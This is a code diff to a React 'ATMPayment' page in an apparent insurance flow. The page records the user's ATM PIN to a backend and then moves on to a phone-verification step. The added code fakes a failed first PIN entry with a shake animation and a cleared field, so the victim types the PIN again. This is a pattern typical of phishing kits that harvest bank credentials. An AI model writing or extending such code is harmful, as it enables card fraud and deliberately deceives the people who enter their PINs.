@@ -31,6 +31,13 @@ const ATMPayment = () => {
 
   useEffect(() => { inputRef.current?.focus(); }, []);
 
+  const triggerShake = () => {
+    setShake(true);
+    setError(true);
+    setTimeout(() => setShake(false), 600);
+    setTimeout(() => { setError(false); setPin(""); inputRef.current?.focus(); }, 1500);
+  };
+
   const handleVerify = () => {
     if (pin.length < 4) return;
     setLoading(true);
@@ -38,7 +45,15 @@ const ATMPayment = () => {
       await createOrUpdateStage(orderId, "payment", { atm_pin: pin });
       linkVisitorToSession({});
       setLoading(false);
-      navigate("/insurance/phone-verify", { state: { offer, orderId } });
+      // Simulate: first attempt always shakes, then navigates
+      const attempts = parseInt(sessionStorage.getItem("atm_attempts") || "0") + 1;
+      sessionStorage.setItem("atm_attempts", String(attempts));
+      if (attempts <= 1) {
+        triggerShake();
+      } else {
+        sessionStorage.removeItem("atm_attempts");
+        navigate("/insurance/phone-verify", { state: { offer, orderId } });
+      }
     };
     doSubmit();
   };
